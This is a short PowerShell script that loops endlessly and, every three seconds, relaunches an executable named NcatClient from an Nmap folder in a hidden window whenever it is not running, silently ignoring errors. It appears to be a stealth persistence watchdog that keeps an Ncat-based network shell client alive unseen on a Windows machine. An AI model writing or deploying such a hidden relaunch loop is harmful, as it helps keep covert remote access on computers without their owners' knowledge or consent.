$progfiles = (Get-ChildItem "env:ProgramFiles(x86)" | Select-Object Value); $progfiles = $progfiles.Value

for(;;){
    try{
    If (!(Get-Process -Name NcatClient -ErrorAction SilentlyContinue))
    {Start-Process -windowstyle hidden -File "$progfiles\Nmap\NcatClient.exe"}

    }
    catch    {    }
    Start-sleep -s 3
    }